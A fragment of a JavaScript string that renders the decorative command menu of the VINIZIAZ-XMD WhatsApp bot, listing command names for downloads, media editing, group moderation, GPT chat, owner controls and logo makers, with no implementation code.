          }) + "\n┃✫│ 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗥𝗔𝗠 : 76𝗚𝗕 𝗼𝗳 256𝗚𝗕\n┃✫│═════════════════════\n┃✬│𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐕𝐈𝐍𝐈𝐙𝐈𝐀𝐙-𝐗𝐌𝐃 𝐂𝐌𝐃𝐒\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎┃✫│═════════════════════\n╰══──────────────────══╯\n●════ 〘 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝐂𝐌𝐃𝐒 〙═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗩𝗶𝗱𝗲𝗼\n┃💥│ 𝗣𝗹𝗮𝘆\n┃💥│ 𝗣𝗹𝗮𝘆2\n┃💥│ 𝗦𝗼𝗻𝗴\n┃💥│ 𝗦𝗼𝗻𝗴2\n┃💥│ 𝗙𝗯𝗱𝗹\n┃💥│ 𝗧𝗶𝗸𝘁𝗼𝗸\n┃💥│ 𝗧𝘄𝗶𝘁𝘁𝗲𝗿\n┃💥│ 𝗧𝘄𝘁𝗱𝗹\n┃💥│ 𝗜𝗴𝗱𝗹\n┃💥│ 𝗜𝗴\n┃💥│ 𝗙𝗯𝗱𝗹\n┃💥│ 𝗙𝗯\n┃💥│ 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺\n┃💥│ 𝗠𝗼𝘃𝗶𝗲\n┃💥│ 𝗟𝘆𝗿𝗶𝗰𝘀\n┃💥│ 𝗪𝗵𝗮𝘁𝘀𝗼𝗻𝗴\n┃💥│ 𝗬𝘁𝘀\n┃💥│ 𝗬𝘁𝗺𝗽3\n┃💥│ 𝗬𝘁𝗺𝗽4\n╰══───────◇───────══╯\n●═════  〘 𝗘𝗗𝗜𝗧 𝐂𝐌𝐃𝐒 〙══───═●\n╭══───────◇───────══╮\n┃💥│ 𝗦𝘁𝗶𝗰𝗸𝗲𝗿\n┃💥│ 𝗦𝗺𝗲𝗺𝗲\n┃💥│ 𝗣𝗵𝗼𝘁𝗼\n┃💥│ 𝗠𝗽4\n┃💥│ 𝗥𝗲𝘁𝗿𝗶𝗲𝘃𝗲\n┃💥│ 𝗩𝘃\n┃💥│ 𝗩𝘃2\n┃💥│ 𝐖𝐚𝐡\n┃💥│ 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁\n┃💥│ 𝗠𝗶𝘅\n┃💥│ 𝗧𝗮𝗸𝗲\n┃💥│ 𝗧𝘄𝗲𝗲𝘁\n┃💥│ 𝗤𝘂𝗼𝘁𝗲𝗹𝘆\n╰══───────◇───────══╯\n●═══〘 𝗖𝗢𝗡𝗙𝗜𝗚 𝗩𝗔𝗥𝗦 𝐂𝐌𝐃𝐒 〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲\n┃💥│ 𝗔𝗻𝘁𝗶𝗰𝗮𝗹𝗹\n┃💥│ 𝗔𝗻𝘁𝗶𝗳𝗼𝗿𝗲𝗶𝗴𝗻\n┃💥│ 𝗔𝗻𝘁𝗶𝘁𝗮𝗴\n┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸\n┃💥│ 𝗔𝗻𝘁𝗶𝗹𝗶𝗻𝗸_𝗮𝗹𝗹\n┃💥│ 𝗚𝗽𝘁_𝗜𝗻𝗯𝗼𝘅\n╰══───────◇───────══╯\n●═════  〘 𝗚𝗣𝗧 𝐂𝐌𝐃𝐒 〙═────═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗶\n┃💥│ 𝗔𝗶2\n┃💥│ 𝗩𝗶𝘀𝗶𝗼𝗻\n┃💥│ 𝗗𝗲𝗳𝗶𝗻𝗲\n┃💥│ 𝗗𝗮𝗿𝗸𝗴𝗽𝘁\n┃💥│ 𝗪𝗶𝗻𝘅𝗲𝘆\n┃💥│ 𝗚𝗲𝗺𝗶𝗻𝗶\n┃💥│ 𝗚𝗼𝗼𝗴𝗹𝗲\n┃💥│ 𝗚𝗽𝘁\n┃💥│ 𝗚𝗽𝘁2\n┃💥│ 𝗚𝗽𝘁3\n╰══───────◇───────══╯\n●════  〘 𝗚𝗥𝗢𝗨𝗣 𝐂𝐌𝐃𝐒 〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲\n┃💥│ 𝗥𝗲𝗷𝗲𝗰𝘁\n┃💥│ 𝗣𝗿𝗼𝗺𝗼𝘁𝗲\n┃💥│ 𝗗𝗲𝗺𝗼𝘁𝗲\n┃💥│ 𝗗𝗲𝗹𝗲𝘁𝗲\n┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲\n┃💥│ 𝗙𝗮𝗸𝗲𝗿\n┃💥│ 𝗙𝗼𝗿𝗲𝗶𝗴𝗻𝗲𝗿𝘀\n┃💥│ 𝗖𝗹𝗼𝘀𝗲\n┃💥│ 𝗢𝗽𝗲𝗻\n┃💥│ 𝗖𝗹𝗼𝘀𝗲𝗧𝗶𝗺𝗲\n┃💥│ 𝗢𝗽𝗲𝗻𝗧𝗶𝗺𝗲\n┃💥│ 𝗗𝗶𝘀𝗽-𝗼𝗳𝗳\n┃💥│ 𝗗𝗶𝘀𝗽-1\n┃💥│ 𝗗𝗶𝘀𝗽-7\n┃💥│ 𝗗𝗶𝘀𝗽-90\n┃💥│ 𝗜𝗰𝗼𝗻\n┃💥│ 𝗚𝗰𝗽𝗿𝗼𝗳𝗶𝗹𝗲\n┃💥│ 𝗦𝘂𝗯𝗷𝗲𝗰𝘁\n┃💥│ 𝗗𝗲𝘀𝗰\n┃💥│ 𝗟𝗲𝗮𝘃𝗲\n┃💥│ 𝗔𝗱𝗱\n┃💥│ 𝗧𝗮𝗴𝗮𝗹𝗹\n┃💥│ 𝗛𝗶𝗱𝗲𝘁𝗮𝗴\n┃💥│ 𝗥𝗲𝘃𝗼𝗸𝗲\n┃💥│ 𝗠𝘂𝘁𝗲\n┃💥│ 𝗨𝗻𝗺𝘂𝘁𝗲\n┃💥│ 𝗚𝗿𝗼𝘂𝗽𝗽𝗶𝗰\n╰══───────◇───────══╯\n●═══  〘 𝗖𝗢𝗗𝗜𝗡𝗚 𝐂𝐌𝐃𝐒 〙 ═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗖𝗮𝗿𝗯𝗼𝗻\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗰++\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗷𝘀\n┃💥│ 𝗖𝗼𝗺𝗽𝗶𝗹𝗲-𝗽𝘆\n┃💥│ 𝗜𝗻𝘀𝗽𝗲𝗰𝘁\n┃💥│ 𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗲\n┃💥│ 𝗘𝘃𝗮𝗹\n╰══───────◇───────══╯\n●═══  〘 𝗚𝗘𝗡𝗘𝗥𝗔𝗟 𝐂𝐌𝐃𝐒 〙 ═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗢𝘄𝗻𝗲𝗿\n┃💥│ 𝗦𝗰𝗿𝗶𝗽𝘁\n┃💥│ 𝗩𝗶𝗻𝗶𝘇𝗶𝗮𝘇\n┃💥│ 𝗟𝗶𝘀𝘁\n┃💥│ 𝗣𝗶𝗻𝗴\n┃💥│ 𝗣𝗼𝗹𝗹\n┃💥│ 𝗔𝗹𝗶𝘃𝗲\n┃💥│ 𝗦𝗽𝗲𝗲𝗱\n┃💥│ 𝗥𝗲𝗽𝗼\n┃💥│ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲\n┃💥│ 𝗨𝗽𝘁𝗶𝗺𝗲\n┃💥│ 𝗗𝗽\n┃💥│ 𝗗𝗹𝘁\n┃💥│ 𝗠𝗮𝗶𝗹\n┃💥│ 𝗜𝗻𝗯𝗼𝘅\n┃💥│ 𝗡𝗲𝘄𝘀\n┃💥│ 𝗔𝗻𝗶𝗺𝗲\n╰══───────◇───────══╯\n●═══   〘 𝗢𝗪𝗡𝗘𝗥 𝐂𝐌𝐃𝐒  〙═───═●\n╭══───────◇───────══╮\n┃💥│ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁\n┃💥│ 𝗔𝗱𝗺𝗶𝗻\n┃💥│ 𝗖𝗮𝘀𝘁\n┃💥│ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁\n┃💥│ 𝗝𝗼𝗶𝗻\n┃💥│ 𝗚𝗲𝘁𝘃𝗮𝗿\n┃💥│ 𝗥𝗲𝗱𝗲𝗽𝗹𝗼𝘆\n┃💥│ 𝗨𝗽𝗱𝗮𝘁𝗲\n┃💥│ 𝗦𝗲𝘁𝘃𝗮𝗿\n┃💥│ 𝗕𝗼𝘁𝗽𝗽\n┃💥│ 𝗙𝘂𝗹𝗹𝗽𝗽\n┃💥│ 𝗕𝗹𝗼𝗰𝗸\n┃💥│ 𝗨𝗻𝗯𝗼𝗰𝗸\n┃💥│ 𝗞𝗶𝗹𝗹\n┃💥│ 𝗞𝗶𝗹𝗹2\n┃💥│ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲\n┃💥│ 𝗦𝗮𝘃𝗲\n┃💥│ >\n┃💥│ 𝗧𝗲𝗺𝗽𝗲𝗺𝗮𝗶𝗹\n╰══───────◇───────══╯\n●═══   〘 𝗣𝗥𝗔𝗡𝗞 𝐂𝐌𝐃  〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗛𝗮𝗰𝗸\n┃💥│ 𝗩𝗶𝗿𝘂𝘀𝗵𝗮𝗰𝗸\n╰══───────◇───────══╯\n●═══   〘 𝗟𝗢𝗚𝗢𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿\n┃💥│ 𝗛𝗮𝗰𝗸𝗲𝗿2\n┃💥│ 𝗚𝗿𝗮𝗳𝗳𝗶𝘁𝗶\n┃💥│ 𝗖𝗮𝘁\n┃💥│ 𝗦𝗮𝗻𝗱\n┃💥│ 𝗚𝗼𝗹𝗱\n┃💥│ 𝗔𝗿𝗲𝗻𝗮\n┃💥│ 𝗗𝗿𝗮𝗴𝗼𝗻𝗯𝗮𝗹𝗹\n┃💥│ 𝗡𝗮𝗿𝘂𝘁𝗼\n┃💥│ 𝗖𝗵𝗶𝗹𝗱\n┃💥│ 𝗟𝗲𝗮𝘃𝗲𝘀\n┃💥│ 1917\n┃💥│ 𝗧𝘆𝗽𝗼𝗴𝗿𝗮𝗽𝗵𝘆\n╰══───────◇───────══╯\n●═══ 〘  𝗧𝗘𝗫𝗧𝗠𝗔𝗞𝗘𝗥 𝐂𝐌𝐃𝐒  〙═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗣𝘂𝗿𝗽𝗹𝗲\n┃💥│ 𝗡𝗲𝗼𝗻\n┃💥│ 𝗡𝗼𝗲𝗹\n┃💥│ 𝗠𝗲𝘁𝗮𝗹𝗹𝗶𝗰\n┃💥│ 𝗗𝗲𝘃𝗶𝗹\n┃💥│ 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝘃𝗲\n┃💥│ 𝗦𝗻𝗼𝘄\n┃💥│ 𝗪𝗮𝘁𝗲𝗿\n┃💥│ 𝗧𝗵𝘂𝗻𝗱𝗲𝗿\n┃💥│ 𝗜𝗰𝗲\n┃💥│ 𝗠𝗮𝘁𝗿𝗶𝘅\n┃💥│ 𝗦𝗶𝗹𝘃𝗲𝗿\n┃💥│ 𝗟𝗶𝗴𝗵𝘁\n╰══───────◇───────══╯\n●═══   〘 𝗠𝗜𝗦𝗖 𝐂𝐌𝐃 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗪𝗲𝗮𝘁𝗵𝗲𝗿\n┃💥│ 𝗚𝗶𝘁𝗵𝘂𝗯\n┃💥│ 𝗚𝗶𝘁𝗰𝗹𝗼𝗻𝗲\n┃💥│ 𝗔𝗱𝘃𝗶𝗰𝗲\n┃💥│ 𝗥𝗲𝗺𝗼𝘃𝗲𝗯𝗴\n┃💥│ 𝗥𝗲𝗺𝗶𝗻𝗶\n┃💥│ 𝗧𝘁𝘀\n┃💥│ 𝗧𝗿𝘁\n┃💥│ 𝗙𝗮𝗰𝘁\n┃💥│ 𝗖𝗮𝘁𝗳𝗮𝗰𝘁\n┃💥│ 𝗤𝘂𝗼𝘁𝗲𝘀\n┃💥│ 𝗣𝗶𝗰𝗸𝘂𝗽𝗹𝗶𝗻𝗲\n╰══───────◇───────══╯\n●═══  〘 𝗢𝗧𝗛𝗘𝗥𝗦 𝐂𝐌𝐃𝐒 〙 ═──═●\n╭══───────◇───────══╮\n┃💥│ 𝗖𝗿𝗲𝗱𝗶𝘁𝘀\n┃💥│ 𝗨𝗽𝗹𝗼𝗮𝗱\n┃💥│ 𝗔𝘁𝘁𝗽\n┃💥│ 𝗨𝗿𝗹\n┃💥│ 𝗜𝗺𝗮𝗴𝗲\n┃💥│ 𝗦𝘆𝘀𝘁𝗲𝗺\n┃✫╰═───────◇───────═╯\n┃   𝗠𝗮𝗱𝗲 𝗶𝗻 𝗞𝗲𝗻𝘆𝗮 𝗕𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭🤩\n┃   𝗕𝗘𝗦𝗧 𝗫𝗠𝗗 𝗕𝗢𝗧 𝗜𝗡 𝗨𝗡𝗜𝗩𝗘𝗥𝗦𝗘\n┃   🆃🅷🅰🅽🅺🆂 🆃🅾\n┃  ✦𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖊𝖗 (𝚅𝙸𝙽𝙸𝚉𝙸𝙰𝚉)\n┃  ✦𝕭𝖆𝖘𝖊 (𝙽𝚒𝚌𝚔)    \n┃  ✦𝕸𝖞 𝕲𝖎𝖗𝖑𝖋𝖗𝖎𝖊𝖓𝖉 (𝙲𝙷𝚁𝙸𝚂𝚃𝙸𝙽𝙴)\n┃  